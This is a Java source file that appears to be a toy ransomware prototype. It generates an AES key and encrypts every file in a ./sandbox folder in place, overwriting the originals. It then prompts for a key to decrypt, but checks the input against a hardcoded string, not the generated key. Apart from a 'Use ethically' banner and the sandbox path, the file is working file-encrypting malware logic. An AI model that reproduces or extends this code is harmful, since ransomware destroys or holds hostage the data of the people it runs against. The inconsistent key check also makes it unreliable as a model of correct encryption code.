import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Scanner;
import java.util.Set;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import javax.crypto.SecretKey;

public class Main {
  public static void main(String[] args) {
    try {
      Scanner scanner = new Scanner(System.in);

      System.out.println("[*] Program running, Use ethically");

      SecretKey secretKey = AESCore.generateKey();
      String encodedKey = AESCore.toBase64(secretKey);
      System.out.println("[+] Secret Key (Base64): " + encodedKey);

      //String plaintext = "Here goes a secret Message";
      Set < String > filesToEncrypt = listFiles();
      String fileContent = "";
      System.out.println(filesToEncrypt);
      for (String file: filesToEncrypt) {
        try {
          Path path = Paths.get("./sandbox/" + file);
          fileContent = Files.readString(path);
          String encryptedFile = AESCore.encrypt(fileContent, secretKey);
          Files.writeString(path, encryptedFile);
        } catch (IOException e) {
          System.err.println("Error reading file: " + e.getMessage());
        }
      }
      System.out.println("[*] FILE CONTENT: " + fileContent);

      //String ciphertext = AESCore.encrypt(fileContent, secretKey);
      //System.out.println("[+] Encrypted: " + ciphertext);

      System.out.println("[*] Decrypting, Enter Secret Key: ");
      String UserEncodedKey = scanner.nextLine();
      scanner.close();

      /*if(encodedKey.equals(UserEncodedKey)) {
        String decrypted = AESCore.decrypt(ciphertext, secretKey);
        System.out.println("[+] Decrypted: " + decrypted);
      } else {
        System.out.println("Whoops");
      }*/

      if (UserEncodedKey != null && UserEncodedKey.equals("AAABBBCCC")) {
        for (String file: filesToEncrypt) {
          try {
            Path path = Paths.get("./sandbox/" + file);
            fileContent = Files.readString(path);
            String decryptedFile = AESCore.decrypt(fileContent, secretKey);
            Files.writeString(path, decryptedFile);
          } catch (IOException e) {
            System.err.println("Error reading file: " + e.getMessage());
          }
        }
      } else {
        System.out.println("Whops");
      }

    } catch (Exception e) {
      e.printStackTrace();
    }
  }
  public static Set < String > listFiles() {
    return Stream.of(new File("./sandbox").listFiles())
      .filter(file -> !file.isDirectory())
      .map(File::getName)
      .collect(Collectors.toSet());
  }
}
